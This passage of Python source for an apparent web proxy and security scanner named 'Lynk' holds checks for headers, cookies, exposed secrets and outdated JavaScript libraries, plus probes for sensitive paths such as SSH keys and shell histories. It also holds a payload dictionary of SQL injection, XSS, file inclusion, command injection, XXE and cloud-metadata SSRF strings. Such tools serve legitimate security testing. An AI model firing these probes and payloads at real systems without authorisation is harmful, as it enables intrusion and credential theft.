    ("/backup.zip","Backup archive","critical"),
    ("/backup.tar.gz","Backup archive","critical"),
    ("/backup.sql","DB backup","critical"),
    ("/dump.sql","MySQL dump","critical"),
    ("/database.sql","DB dump","critical"),
    ("/db.sqlite","SQLite DB","critical"),
    ("/id_rsa","SSH private key","critical"),
    ("/.ssh/id_rsa","SSH key","critical"),
    ("/.htaccess","Apache .htaccess","medium"),
    ("/.htpasswd","Apache .htpasswd","high"),
    ("/robots.txt","robots.txt","info"),
    ("/sitemap.xml","sitemap.xml","info"),
    ("/security.txt","security.txt","info"),
    ("/.well-known/security.txt","security.txt","info"),
    ("/.well-known/openid-configuration","OpenID config","info"),
    ("/crossdomain.xml","Flash crossdomain","medium"),
    ("/admin","Admin panel","medium"),
    ("/administrator/","Joomla admin","medium"),
    ("/admin/login","Admin login","medium"),
    ("/wp-login.php","WordPress login","info"),
    ("/wp-admin/","WordPress admin","info"),
    ("/wp-json/wp/v2/users","WP REST users","high"),
    ("/xmlrpc.php","WordPress xmlrpc","medium"),
    ("/phpinfo.php","phpinfo()","critical"),
    ("/info.php","phpinfo()","critical"),
    ("/server-status","Apache server-status","high"),
    ("/server-info","Apache server-info","high"),
    ("/phpMyAdmin/","phpMyAdmin","high"),
    ("/adminer.php","Adminer","high"),
    ("/actuator","Spring actuator","high"),
    ("/actuator/env","Spring env","critical"),
    ("/actuator/beans","Spring beans","high"),
    ("/actuator/heapdump","Spring heapdump","critical"),
    ("/debug","Debug page","medium"),
    ("/debug.log","Debug log","high"),
    ("/error.log","Error log","high"),
    ("/access.log","Access log","high"),
    ("/logs/","Logs directory","high"),
    ("/trace.axd","ASP.NET trace","critical"),
    ("/elmah.axd","ELMAH","high"),
    ("/swagger.json","Swagger JSON","medium"),
    ("/swagger-ui.html","Swagger UI","medium"),
    ("/openapi.json","OpenAPI spec","medium"),
    ("/api-docs","API docs","medium"),
    ("/v2/api-docs","Springfox docs","medium"),
    ("/v3/api-docs","Springfox v3","medium"),
    ("/graphql","GraphQL","medium"),
    ("/graphiql","GraphiQL","medium"),
    ("/health","Health","info"),
    ("/healthz","Healthz","info"),
    ("/metrics","Prometheus metrics","medium"),
    ("/version","Version","low"),
    ("/api/v1","API v1","info"),
    ("/api/v2","API v2","info"),
    ("/api/v1/users","User list","high"),
    ("/api/users","User list","high"),
    ("/.bash_history","Bash history","critical"),
    ("/.zsh_history","Zsh history","critical"),
    ("/.mysql_history","MySQL history","critical"),
    ("/.npmrc","NPM config","high"),
    ("/.netrc","Netrc creds","high"),
    ("/WEB-INF/web.xml","Servlet web.xml","high"),
    ("/cgi-bin/","CGI directory","medium"),
    ("/shell.php","Webshell","critical"),
    ("/upload.php","Upload endpoint","medium"),
    ("/humans.txt","humans.txt","info"),
    ("/ads.txt","ads.txt","info"),
]

CMS_ENDPOINTS = [
    ("/wp-content/debug.log","WP debug log","high"),
    ("/wp-content/uploads/","WP uploads dir","medium"),
    ("/wp-json/","WP REST root","medium"),
    ("/wp-sitemap.xml","WP sitemap","info"),
    ("/CHANGELOG.txt","Drupal changelog","medium"),
    ("/sites/default/settings.php","Drupal settings","critical"),
    ("/administrator/manifests/files/joomla.xml","Joomla version","medium"),
]

HTTP_METHODS = ["OPTIONS","HEAD","TRACE","PUT","DELETE","PATCH","PROPFIND","COPY","MOVE","CONNECT"]
CORS_PROBES = ["https://evil.example", "null"]

JS_LIBS = [
    (r'jquery[.\-/]?v?(\d+\.\d+\.\d+)', "jQuery", r'^3\.[5-9]',
     "jQuery < 3.5 XSS in htmlPrefilter (CVE-2020-11022/11023).","medium"),
    (r'bootstrap[.\-/]?(\d+\.\d+\.\d+)', "Bootstrap", r'^[45]\.',
     "Bootstrap 3.x EOL.","low"),
    (r'angular[.\-/]?(\d+\.\d+\.\d+)', "AngularJS", r'^1\.[78]',
     "AngularJS 1.x EOL.","high"),
    (r'lodash[.\-/]?v?(\d+\.\d+\.\d+)', "Lodash", r'^4\.1[7-9]',
     "Prototype pollution < 4.17.12.","high"),
    (r'moment[.\-/]?v?(\d+\.\d+\.\d+)', "Moment.js", r'^2\.29',
     "Moment < 2.29.2 ReDoS.","medium"),
    (r'handlebars[.\-/]?v?(\d+\.\d+\.\d+)', "Handlebars", r'^4\.7\.[6-9]',
     "Handlebars < 4.7.7 proto pollution.","high"),
    (r'ckeditor[.\-/]?v?(\d+\.\d+\.\d+)', "CKEditor", r'^[45]\.',
     "CKEditor 4.x XSS.","high"),
    (r'axios[.\-/]?v?(\d+\.\d+\.\d+)', "Axios", r'^(1|0\.2[7-9])',
     "Axios < 0.21.2 SSRF.","high"),
    (r'select2[.\-/]?v?(\d+\.\d+\.\d+)', "Select2", r'^4\.[01]',
     "Select2 < 4.0.13 XSS.","high"),
    (r'dompurify[.\-/]?v?(\d+\.\d+\.\d+)', "DOMPurify", r'^[23]\.',
     "DOMPurify < 2.4.3 mXSS.","high"),
    (r'polyfill\.io', "polyfill.io", r'^$',
     "polyfill.io 2024 supply-chain hijack.","critical"),
    (r'highlight[.\-/]?js[.\-/]?v?(\d+\.\d+\.\d+)', "highlight.js", r'^1[01]\.',
     "highlight.js < 10.4.1 XSS.","medium"),
    (r'prism[.\-/]?v?(\d+\.\d+\.\d+)', "Prism.js", r'^1\.[2-9][0-9]',
     "Prism < 1.25 XSS.","medium"),
    (r'marked[.\-/]?v?(\d+\.\d+\.\d+)', "marked", r'^[4-9]\.',
     "marked < 4.0.10 ReDoS.","medium"),
    (r'jsonwebtoken[.\-/]?v?(\d+\.\d+\.\d+)', "jsonwebtoken", r'^[89]\.',
     "jsonwebtoken < 9 alg confusion.","high"),
]


def _sev_rank(s):
    return {"critical":0,"high":1,"medium":2,"low":3,"info":4}.get(s,5)


class Finding:
    __slots__ = ("id","name","severity","category","description",
                 "evidence","remediation","url","path")
    def __init__(self, id, name, severity, category, description,
                 evidence="", remediation="", url="", path=""):
        self.id = id; self.name = name; self.severity = severity
        self.category = category; self.description = description
        self.evidence = evidence; self.remediation = remediation
        self.url = url; self.path = path
    def to_dict(self):
        return {"id":self.id,"name":self.name,"severity":self.severity,
                "category":self.category,"description":self.description,
                "evidence":self.evidence,"remediation":self.remediation,
                "url":self.url,"path":self.path}


def _check_headers(headers, url):
    out = []
    for name,(sev,label,desc,rem) in SECURITY_HEADERS.items():
        if sev == "info": continue
        if name in headers: continue
        out.append(Finding(f"HDR-{len(out)+1:03d}", label, sev, "headers",
                           desc, f"Header '{name}' missing", rem, url))
    hsts = headers.get("strict-transport-security","")
    if hsts:
        m = re.search(r"max-age\s*=\s*(\d+)", hsts)
        if m and int(m.group(1)) < 15552000:
            out.append(Finding("HDR-101","HSTS max-age too short","low","headers",
                               f"max-age={m.group(1)}s < 180 days", hsts,
                               "Increase to ≥ 31536000.", url))
    csp = headers.get("content-security-policy","")
    if csp:
        if "'unsafe-inline'" in csp:
            out.append(Finding("HDR-102","CSP allows unsafe-inline","high","headers",
                               "unsafe-inline defeats XSS protection.", csp[:300],
                               "Use nonces/hashes instead.", url))
        if "'unsafe-eval'" in csp:
            out.append(Finding("HDR-103","CSP allows unsafe-eval","high","headers",
                               "unsafe-eval permits eval().", csp[:300],
                               "Remove unsafe-eval.", url))
    return out


def _check_cookies(headers, url):
    out = []
    sc = headers.get("set-cookie","")
    if not sc: return out
    for raw in re.split(r",(?=[^;=]+=)", sc):
        raw = raw.strip()
        if not raw: continue
        parts = [p.strip() for p in raw.split(";")]
        nv = parts[0]
        if "=" not in nv: continue
        name = nv.split("=",1)[0].strip()
        flags = {p.lower().split("=",1)[0]: p for p in parts[1:]}
        https = url.startswith("https://")
        if https and "secure" not in flags:
            out.append(Finding("COOK-001", f"Cookie '{name}' missing Secure",
                               "medium","cookies","May be sent over HTTP.",
                               raw[:300], "Add Secure.", url))
        if "httponly" not in flags:
            out.append(Finding("COOK-002", f"Cookie '{name}' missing HttpOnly",
                               "medium","cookies","Readable by JS.",
                               raw[:300], "Add HttpOnly.", url))
        if "samesite" not in flags:
            out.append(Finding("COOK-003", f"Cookie '{name}' missing SameSite",
                               "low","cookies","CSRF risk.",
                               raw[:300], "Add SameSite=Lax/Strict.", url))
        low = name.lower()
        if any(s in low for s in ("session","sessid","auth","token","jwt","sid")) \
                and "httponly" not in flags:
            out.append(Finding("COOK-005", f"Sensitive cookie '{name}' without HttpOnly",
                               "high","cookies","Session-like cookie lacks HttpOnly.",
                               raw[:300], "Add HttpOnly.", url))
    return out


def _check_html(body, url):
    out = []
    try: soup = BeautifulSoup(body, "html.parser")
    except Exception: return out
    for inp in soup.find_all("input", attrs={"type":"password"}):
        ac = (inp.get("autocomplete") or "").lower()
        if ac not in ("off","new-password","current-password"):
            out.append(Finding("HTML-001","Password field missing autocomplete",
                               "low","html","Password input lacks autocomplete.",
                               str(inp)[:200], "Add autocomplete=new-password.", url))
            break
    for form in soup.find_all("form"):
        action = (form.get("action") or "").strip()
        if action.startswith("http://"):
            out.append(Finding("HTML-002","Form posts over plain HTTP","high","html",
                               "Form action uses http://.", action[:200],
                               "Use https://.", url))
        if form.get("method","get").lower() == "post":
            if form.find("input", attrs={"name":re.compile(r"csrf|xsrf|_token", re.I)}) is None:
                out.append(Finding("HTML-003","POST form without CSRF token",
                                   "medium","html","No anti-CSRF token.",
                                   str(form)[:200], "Add CSRF token input.", url))
                break
    patterns = [
        (r'AKIA[0-9A-Z]{16}', "AWS Access Key", "critical"),
        (r'AIza[0-9A-Za-z\-_]{35}', "Google API Key", "high"),
        (r'gh[pousr]_[A-Za-z0-9]{36}', "GitHub Token", "critical"),
        (r'sk_live_[0-9a-zA-Z]{24,}', "Stripe Live Key", "critical"),
        (r'xox[baprs]-[0-9A-Za-z\-]+', "Slack Token", "critical"),
        (r'(?:mongodb|postgres|mysql|redis)://[^\s"\'<>]+', "DB Connection String", "critical"),
        (r'-----BEGIN (RSA |EC |OPENSSH )?PRIVATE KEY-----', "Private Key", "critical"),
    ]
    for pat, name, sev in patterns:
        m = re.search(pat, body)
        if m:
            out.append(Finding(f"HTML-SEC-{len(out)}", f"Secret in HTML: {name}",
                               sev,"html","Credential pattern found.",
                               m.group(0)[:120],
                               "Remove from client; rotate the credential.", url))
    if url.startswith("https://") and re.search(r'(?:src|href)="http://', body, re.I):
        out.append(Finding("HTML-301","Mixed content on HTTPS","medium","html",
                           "HTTPS page references http:// assets.",
                           "Found http:// in src/href.",
                           "Reference all assets over https://.", url))
    for sc in soup.find_all("script", src=True):
        src = sc["src"]
        if src.startswith(("http://","https://")):
            h = urlparse(src).netloc
            ours = urlparse(url).netloc
            if h and ours and h != ours and not sc.get("integrity"):
                out.append(Finding("HTML-300","External script without SRI",
                                   "medium","html","3rd-party script without integrity.",
                                   src[:200], "Add integrity + crossorigin.", url))
                break
    return out


def _check_libs(body, url):
    out = []
    for pat, name, safe, note, sev in JS_LIBS:
        m = re.search(pat, body, re.I)
        if not m: continue
        ver = m.group(1) if m.groups() else "?"
        if re.search(safe, ver): continue
        out.append(Finding(f"LIB-{name.lower()[:8]}-{ver[:10]}",
                          f"Vulnerable JS: {name} {ver}", sev, "libraries",
                          note, f"{name} {ver}",
                          f"Upgrade {name} past {safe}.", url))
    return out


async def _check_methods(url, timeout=8.0):
    out = []
    for m in HTTP_METHODS:
        try:
            r = await app.fetch(url, method=m, headers=BROWSER_HEADERS,
                                timeout=timeout, allow_redirects=False,
                                max_redirects=0, prefer_http2=False, use_doh=True)
        except Exception: continue
        st = r.status_code
        p = urlparse(url); path = p.path or "/"
        if m == "TRACE" and st == 200:
            out.append(Finding("HTTP-001","TRACE enabled","medium","http-methods",
                               "XST possible.", f"TRACE → {st}","Disable TRACE.", url, path))
        elif m == "PUT" and st in (200,201,204):
            out.append(Finding("HTTP-002","PUT allowed","high","http-methods",
                               "Write may be possible.", f"PUT → {st}",
                               "Restrict write methods.", url, path))
        elif m == "DELETE" and st in (200,204):
            out.append(Finding("HTTP-003","DELETE allowed","high","http-methods",
                               "Server accepts DELETE.", f"DELETE → {st}",
                               "Restrict DELETE.", url, path))
        elif m == "PROPFIND" and st in (200,207):
            out.append(Finding("HTTP-004","WebDAV enabled","medium","http-methods",
                               "WebDAV file listing.", f"PROPFIND → {st}",
                               "Disable WebDAV if unused.", url, path))
        elif m == "CONNECT" and st in (200,201):
            out.append(Finding("HTTP-005","CONNECT allowed","high","http-methods",
                               "Open proxy risk.", f"CONNECT → {st}",
                               "Restrict CONNECT.", url, path))
    return out


async def _check_cors(url, timeout=8.0):
    out = []
    for origin in CORS_PROBES:
        try:
            r = await app.fetch(url, headers={**BROWSER_HEADERS, "Origin": origin},
                                timeout=timeout, allow_redirects=False,
                                max_redirects=0, prefer_http2=False, use_doh=True)
        except Exception: continue
        acao = r.headers.get("access-control-allow-origin","")
        acac = r.headers.get("access-control-allow-credentials","").lower()
        p = urlparse(url)
        if acao == "*" and acac == "true":
            out.append(Finding("CORS-001","CORS wildcard with credentials",
                               "critical","cors","Catastrophic CORS.",
                               "ACAO: * / ACAC: true",
                               "Never combine * with credentials.", url, p.path))
            break
        if acao == origin and origin != "null" and acac == "true":
            out.append(Finding("CORS-002","CORS reflected + credentials",
                               "high","cors","Account takeover possible.",
                               f"ACAO: {origin} / ACAC: true",
                               "Validate Origin against allowlist.", url, p.path))
            break
        if acao == "null":
            out.append(Finding("CORS-003","CORS allows null origin","medium","cors",
                               "Null origin easy to spoof.",
                               "ACAO: null", "Do not allow null.", url, p.path))
    return out


async def _check_paths(base, paths, timeout=6.0, conc=12):
    out = []
    sem = asyncio.Semaphore(conc)
    rp = f"/__lynk_nonexistent_{uuid.uuid4().hex[:8]}"
    base_st = 0; base_body = b""; base_ct = ""
    try:
        r = await app.fetch(urljoin(base, rp), headers=BROWSER_HEADERS,
                            timeout=timeout, allow_redirects=False,
                            max_redirects=0, prefer_http2=False, use_doh=True)
        base_st, base_ct = r.status_code, r.headers.get("content-type","")
        base_body = r.content[:2048]
    except Exception: pass
    async def probe(entry):
        path, label, sev = entry
        async with sem:
            try:
                target = urljoin(base, path)
                r = await app.fetch(target, headers=BROWSER_HEADERS,
                                    timeout=timeout, allow_redirects=False,
                                    max_redirects=0, prefer_http2=False, use_doh=True)
                return (path, label, sev, target, r)
            except Exception: return None
    results = await asyncio.gather(*[probe(p) for p in paths])
    n = 0
    for item in results:
        if item is None: continue
        path, label, sev, target, r = item
        code = r.status_code
        ctype = r.headers.get("content-type","")
        body = r.content[:2048]
        if code not in (200,201,202,203,206): continue
        if code == base_st and body == base_body and ctype == base_ct: continue
        if "text/html" in ctype and base_ct.startswith("text/html"):
            low = body.lower()
            if any(x in low for x in (b"not found",b"404 not found",b"page not found")): continue
        n += 1
        content_len = len(r.content)
        out.append(Finding(f"PATH-{n:03d}", f"Exposed: {label}", sev, "paths",
                          f"{path} → HTTP {code} ({content_len} bytes, {ctype})",
                          f"GET {target}\nStatus: {code}\nType: {ctype}\nBytes: {content_len}",
                          f"Remove or restrict access to {path}.", target, path))
    return out


async def run_vuln_scan(url, active=True):
    try:
        resp = await app.fetch(url, headers=BROWSER_HEADERS, timeout=25.0,
                               allow_redirects=True, max_redirects=3,
                               prefer_http2=True, use_doh=True, connect_retries=2)
        headers = dict(resp.headers); raw = resp.content
        if headers.get("content-encoding"): raw = decode_body(raw, headers["content-encoding"])
        charset = detect_charset(headers.get("content-type",""), raw)
        try: body = raw.decode(charset, errors="replace")
        except LookupError: body = raw.decode("utf-8", errors="replace")
    except Exception as e:
        return {"error": f"fetch failed: {e}", "findings": [], "url": url}
    findings = []
    findings.extend(_check_headers(headers, url))
    findings.extend(_check_cookies(headers, url))
    findings.extend(_check_html(body, url))
    findings.extend(_check_libs(body, url))
    if active:
        try: findings.extend(await _check_methods(url, timeout=8.0))
        except Exception as e: log.debug(f"methods: {e}")
        try: findings.extend(await _check_cors(url, timeout=8.0))
        except Exception as e: log.debug(f"cors: {e}")
        try: findings.extend(await _check_paths(url, SENSITIVE_PATHS + CMS_ENDPOINTS,
                                                timeout=6.0, conc=16))
        except Exception as e: log.debug(f"paths: {e}")
    findings.sort(key=lambda f: _sev_rank(f.severity))
    return {"url": url, "scanned_at": time.time(),
            "check_count": (len(SECURITY_HEADERS) + 30 + 40 +
                            len(SENSITIVE_PATHS) + len(CMS_ENDPOINTS) +
                            len(HTTP_METHODS) + len(CORS_PROBES)),
            "findings": [f.to_dict() for f in findings]}


# ======================================================================
# PAYLOADS
# ======================================================================
PAYLOADS = {
    "sqli": ["'", "''", "' OR '1'='1", "' OR 1=1--", "' OR 1=1#", "\" OR \"1\"=\"1",
             "' UNION SELECT NULL--", "' AND SLEEP(0)--", "1' AND 1=1--",
             "';WAITFOR DELAY '0:0:0'--", "' AND extractvalue(1,concat(0x7e,version()))--",
             "') OR ('1'='1", "1)) OR ((1=1", "' OR 'a'='a", "'))--"],
    "nosqli": ["' || '1'=='1", "{\"$ne\": null}", "{\"$gt\": \"\"}",
               "{\"$where\": \"1==1\"}", "[$ne]=1", "[$regex]=.*"],
    "xss": ["<script>alert(1)</script>", "<img src=x onerror=alert(1)>",
            "\"><script>alert(1)</script>", "'><svg onload=alert(1)>",
            "javascript:alert(1)", "<body onload=alert(1)>",
            "<iframe src=javascript:alert(1)>", "<details open ontoggle=alert(1)>"],
    "lfi": ["../../../../etc/passwd", "..%2F..%2F..%2Fetc%2Fpasswd",
            "....//....//....//etc/passwd", "..\\..\\..\\windows\\win.ini",
            "/proc/self/environ", "php://filter/convert.base64-encode/resource=index.php"],
    "rfi": ["https://example.com/shell.txt", "//example.com/shell",
            "data://text/plain,<?php echo 1;?>"],
    "ssti": ["{{7*7}}", "${7*7}", "#{7*7}", "<%= 7*7 %>", "{{config}}", "{{self}}", "*{7*7}"],
    "cmdi": [";id", "|id", "&&id", "||id", "`id`", "$(id)", ";whoami", "%0Aid", "$IFS$9id"],
    "xxe": ['<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]><r>&x;</r>',
            '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "http://example.com/">]><r>&x;</r>'],
    "ssrf": ["http://127.0.0.1", "http://169.254.169.254/latest/meta-data/",
             "http://metadata.google.internal/", "file:///etc/passwd",
             "gopher://127.0.0.1:6379/_INFO", "http://[::1]/"],
    "crlf": ["%0d%0aX-Injected: lynk", "%0aX-Injected: lynk", "\\r\\nX-Injected: lynk"],
    "open_redirect": ["//evil.example", "https://evil.example", "\\/\\/evil.example",
                      "/\\evil.example", "https:evil.example", "////evil.example"],
    "host_header": ["evil.example", "127.0.0.1", "localhost", "evil.example:8080"],
    "path_traversal": ["..;/", "..%2f", "..%5c", "..%252f", "%2e%2e/", "....//"],
    "http_smuggling": ["Transfer-Encoding: chunked",
                       "Transfer-Encoding: chunked\r\nContent-Length: 6",
                       "Transfer-Encoding : chunked"],
}


# ======================================================================
# probe / diff
# ======================================================================
async def probe(url, method="GET", headers=None, params=None, body=None,
                json_body=None, timeout=12.0, allow_redirects=False,
                follow_headers=False):
    h = dict(BROWSER_HEADERS)
    if headers: h.update(headers)
    t0 = time.time()
    try:
        r = await app.fetch(url, method=method, headers=h, params=params,
                            body=body, json=json_body, timeout=timeout,
                            allow_redirects=allow_redirects, max_redirects=0,
                            prefer_http2=False, use_doh=True, connect_retries=1)
        raw = r.content
        if r.headers.get("content-encoding"):
            raw = decode_body(raw, r.headers["content-encoding"])
        elapsed = int((time.time() - t0) * 1000)
        try: text = raw.decode("utf-8", errors="replace")
        except Exception: text = ""
        return {"ok": True, "status": r.status_code, "length": len(raw),
                "hash": hashlib.sha256(raw).hexdigest()[:16], "time": elapsed,
                "headers": dict(r.headers) if follow_headers else {},
                "body": text[:4000]}
    except Exception as e:
        return {"ok": False, "err": f"{type(e).__name__}: {e}",
                "time": int((time.time() - t0) * 1000)}


def diff_signature(base, probe_r):
    if not base.get("ok") or not probe_r.get("ok"):
        return False, "error"
    if base["status"] != probe_r["status"]:
        return True, f"status {base['status']}→{probe_r['status']}"
    if abs(base["length"] - probe_r["length"]) > max(64, base["length"] * 0.05):
        return True, f"length {base['length']}→{probe_r['length']}"
    if abs(base["time"] - probe_r["time"]) > 1500:
        return True, f"timing {base['time']}ms→{probe_r['time']}ms"
    if base["hash"] != probe_r["hash"]:
        return True, "body hash"
    return False, "no change"


# ======================================================================
# Sessions
# ======================================================================
class CookieJar:
    def __init__(self): self.by_origin = {}
    def add(self, origin, sc):
        jar = self.by_origin.setdefault(origin, {})
        for chunk in re.split(r",(?=[^;=]+=)", sc):
            first = chunk.split(";", 1)[0].strip()
            if "=" in first:
                k, v = first.split("=", 1)
                jar[k.strip()] = v.strip()
    def header_for(self, origin):
        return "; ".join(f"{k}={v}" for k, v in self.by_origin.get(origin, {}).items())
    def merge(self, origin, ch):
        if not ch: return
        jar = self.by_origin.setdefault(origin, {})
        for piece in ch.split(";"):
            piece = piece.strip()
            if piece.lower().startswith(f"{SESSION_COOKIE}="): continue
            if piece.lower().startswith(f"{ORIGIN_COOKIE}="): continue
            if "=" in piece:
                k, v = piece.split("=", 1)
                jar[k.strip()] = v.strip()


class Session:
    def __init__(self):
        self.injected = []
        self.source_cache = {}
        self.history = deque(maxlen=1000)
        self.cookies = CookieJar()
        self.last_origin = ""

SESSIONS = {}

def get_session(sid):
    s = SESSIONS.get(sid)
    if s is None: s = SESSIONS[sid] = Session()
    return s

def session_from_req(req):
    sid = req.cookies.get(SESSION_COOKIE, "")
    if not sid or sid not in SESSIONS:
        sid = uuid.uuid4().hex
        get_session(sid)
        return sid, True
    return sid, False


def esc(t):
    return (str(t).replace("&", "&amp;").replace("<", "&lt;")
                   .replace(">", "&gt;").replace('"', "&quot;"))

def decode_body(body, encoding):
    enc = (encoding or "").lower().strip()
    if not enc or enc == "identity": return body
    try:
        if "gzip" in enc: return gzip.decompress(body)
        if "deflate" in enc:
            try: return zlib.decompress(body)
            except zlib.error: return zlib.decompress(body, -zlib.MAX_WBITS)
    except Exception: pass
    return body

def detect_charset(ct, body):
    m = re.search(r'charset\s*=\s*["\']?([A-Za-z0-9_\-]+)', ct or "", re.I)
    if m: return m.group(1)
    m2 = re.search(rb'charset\s*=\s*["\']?([a-z0-9_\-]+)', body[:4096].lower())
    if m2: return m2.group(1).decode("ascii", "ignore")
    return "utf-8"

def extract_upstream(referer):
    if not referer: return ""
    try:
        p = urlparse(referer)
        if p.path != "/proxy": return ""
        qs = parse_qs(p.query)
        u = (qs.get("url") or [""])[0]
        up = urlparse(u)
        if up.scheme in ("http","https") and up.netloc: return u
    except Exception: pass
    return ""

_SKIP = ("data:","javascript:","mailto:","tel:","blob:","about:","file:","#")
def skip_url(v):
    return not v or any(v.strip().lower().startswith(s) for s in _SKIP)

def proxy_url(absu):
    return f"/proxy?url={quote(absu, safe='')}"

def looks_like_url(s):
    s = (s or "").strip()
    if not s: return False
    if s.startswith(("http://","https://")): return True
    if " " in s: return False
    first = s.split("/", 1)[0]
    return "." in first and not first.startswith(".") and not first.endswith(".")

def rewrite_set_cookie(value):
    parts = [p.strip() for p in value.split(";")]
    if not parts: return value
    kept = [parts[0]]
    for p in parts[1:]:
        pl = p.lower()
        if pl.startswith("domain=") or pl == "secure": continue
        kept.append(p)
    return "; ".join(kept)

def _norm_host(h):
    if not h: return h
    if ":" in h:
        base, port = h.rsplit(":", 1)
        if port in ("80","443"): return base
    return h

def is_self_target(req, target_url):
    try: p = urlparse(target_url)
    except Exception: return False
    incoming = _norm_host((req.headers.get("host") or "").lower())
    target = _norm_host((p.netloc or "").lower())
    return bool(incoming) and incoming == target

def resolve_origin(req, sess):
    ref_up = extract_upstream(req.headers.get("referer",""))
    if ref_up:
        up = urlparse(ref_up); return f"{up.scheme}://{up.netloc}"
    cookie_val = req.cookies.get(ORIGIN_COOKIE,"")
    if cookie_val:
        cookie_val = unquote(cookie_val)
        up = urlparse(cookie_val)
        if up.scheme in ("http","https") and up.netloc: return f"{up.scheme}://{up.netloc}"
    if sess.last_origin: return sess.last_origin
    if sess.history:
        last = sess.history[-1].get("url","")
        if last:
            up = urlparse(last); return f"{up.scheme}://{up.netloc}"
    return ""


def error_page(title, message, status=500):
    html = (
        '<!DOCTYPE html><html><head><meta charset="utf-8">'
        f'<title>{esc(title)} · Lynk</title><style>'
        'body{font-family:Inter,system-ui,sans-serif;background:#070b16;color:#e2e8f0;'
        'display:flex;align-items:center;justify-content:center;min-height:100vh;margin:0;padding:24px}'
        '.card{background:rgba(15,23,42,.68);border:1px solid rgba(148,163,184,.16);'
        'border-radius:20px;max-width:520px;width:100%;padding:32px;text-align:center;'
        'backdrop-filter:blur(20px);box-shadow:0 30px 60px -20px rgba(0,0,0,.55)}'
        '.ic{width:56px;height:56px;border-radius:16px;display:inline-grid;place-items:center;'
        'font-size:1.5rem;margin-bottom:18px;'
        'background:linear-gradient(135deg,rgba(248,113,113,.2),rgba(239,68,68,.1));'
        'border:1px solid rgba(248,113,113,.25)}'
        'h1{font-size:1.35rem;margin:0 0 8px}'
        'p{color:#94a3b8;font-size:.92rem;line-height:1.55;margin:0 0 22px;word-break:break-word}'
        'a{display:inline-flex;gap:6px;background:linear-gradient(135deg,#38bdf8,#818cf8);'
        'color:#0b1220;padding:11px 20px;border-radius:10px;font-weight:700;text-decoration:none}'
        '</style></head><body><div class="card">'
        f'<div class="ic">⚠</div><h1>{esc(title)}</h1><p>{message}</p>'
        '<a href="/">← Back to Lynk</a></div></body></html>'
    )
    return RawResponse(html, status=status, content_type="text/html; charset=utf-8")


# ======================================================================
# INTERCEPTOR
# ======================================================================
INTERCEPTOR_JS = r"""
(function(){
  var ctx = window.__LYNK_CTX__ || {};
  if (!ctx.upstream) return;
  var UP; try { UP = new URL(ctx.upstream); } catch(e) { return; }
  var O = location.origin;
  function rw(u){
    try{
      if(typeof u!=='string' && !(u instanceof URL)) return u;
      var s = typeof u==='string'?u:u.href;
      if(/^(data|blob|javascript|about|mailto|tel):/i.test(s)) return u;
      if(s.indexOf(O+'/proxy')===0||s.indexOf(O+'/__lynk_')===0||
         s.indexOf(O+'/tool/')===0||s.indexOf(O+'/tabs')===0) return u;
      if(s.indexOf('/proxy')===0||s.indexOf('/tool/')===0||
         s.indexOf('/search')===0||s.indexOf('/tabs')===0) return u;
      var abs; try{abs=new URL(s,UP.href);}catch(e){return u;}
      if(abs.origin===O){
        var p=abs.pathname;
        if(p.indexOf('/proxy')===0||p.indexOf('/tool/')===0||
           p.indexOf('/search')===0||p.indexOf('/tabs')===0||
           p.indexOf('/__lynk_')===0||p==='/') return u;
        var up2=new URL(p+abs.search+abs.hash,UP.href);
        return O+'/proxy?url='+encodeURIComponent(up2.href);
      }
      if(abs.protocol==='http:'||abs.protocol==='https:'){
        return O+'/proxy?url='+encodeURIComponent(abs.href);
      }
      return u;
    }catch(e){return u;}
  }
  window.__LYNK_RW__ = rw;
  var of = window.fetch;
  window.fetch = function(i, init){try{
    if(typeof i==='string'||i instanceof URL) return of.call(this,rw(i),init);
    if(i instanceof Request){var nu=rw(i.url); if(nu!==i.url) return of.call(this,new Request(nu,i),init);}
    return of.apply(this,arguments);
  }catch(e){return of.apply(this,arguments);}};
  var oo=XMLHttpRequest.prototype.open;
  XMLHttpRequest.prototype.open=function(m,u){try{arguments[1]=rw(u);}catch(e){}return oo.apply(this,arguments);};
  var RES={'SCRIPT':'src','IMG':'src','IFRAME':'src','EMBED':'src',
    'SOURCE':'src','VIDEO':'src','AUDIO':'src','TRACK':'src',
    'LINK':'href','A':'href','AREA':'href','OBJECT':'data'};
  var _sa=Element.prototype.setAttribute;
  Element.prototype.setAttribute=function(name,value){try{
    var tag=this.tagName, lname=String(name).toLowerCase();
    if(RES[tag]===lname||((tag==='SOURCE'||tag==='IMG')&&lname==='srcset')) value=rw(value);
  }catch(e){} return _sa.call(this,name,value);};
  function fixChild(c){try{
    if(!c||!c.tagName)return;
    var a=RES[c.tagName]; if(!a)return;
    var v=c.getAttribute&&c.getAttribute(a);
    if(v){var nv=rw(v); if(nv!==v) c.setAttribute(a,nv);}
    var ss=c.getAttribute&&c.getAttribute('srcset');
    if(ss){var nss=rw(ss); if(nss!==ss) c.setAttribute('srcset',nss);}
  }catch(e){}}
  var _ac=Node.prototype.appendChild;
  Node.prototype.appendChild=function(c){fixChild(c);return _ac.call(this,c);};
  var _ib=Node.prototype.insertBefore;
  Node.prototype.insertBefore=function(c,r){fixChild(c);return _ib.call(this,c,r);};
})();
"""


# ======================================================================
# UI_SHELL_JS
# ======================================================================
UI_SHELL_JS = r"""
window.__LYNK_UI__ = (function(){
  var toasts = [];
  function toast(msg, kind, ms){
    kind = kind || 'info'; ms = ms || 3200;
    var colors = {
      info: { bg:'rgba(56,189,248,.14)', bd:'rgba(56,189,248,.4)',  fg:'#38bdf8', icon:'ℹ' },
      ok:   { bg:'rgba(16,185,129,.14)', bd:'rgba(16,185,129,.4)',  fg:'#10b981', icon:'✓' },
      warn: { bg:'rgba(245,158,11,.14)', bd:'rgba(245,158,11,.4)',  fg:'#f59e0b', icon:'⚠' },
      err:  { bg:'rgba(248,113,113,.14)',bd:'rgba(248,113,113,.4)', fg:'#f87171', icon:'✕' },
    };
    var c = colors[kind] || colors.info;
    var el = document.createElement('div');
    el.style.cssText = 'position:fixed;bottom:'+(80+toasts.length*56)+'px;right:24px;'
      +'background:'+c.bg+';border:1px solid '+c.bd+';color:'+c.fg+';'
      +'padding:12px 18px;border-radius:12px;font-family:-apple-system,sans-serif;'
      +'font-size:13px;font-weight:600;backdrop-filter:blur(12px);'
      +'box-shadow:0 20px 40px -12px rgba(0,0,0,.55);z-index:2147483648;'
      +'display:flex;align-items:center;gap:10px;min-width:220px;max-width:380px;';
    el.innerHTML = '<span>'+c.icon+'</span><span>'+msg+'</span>';
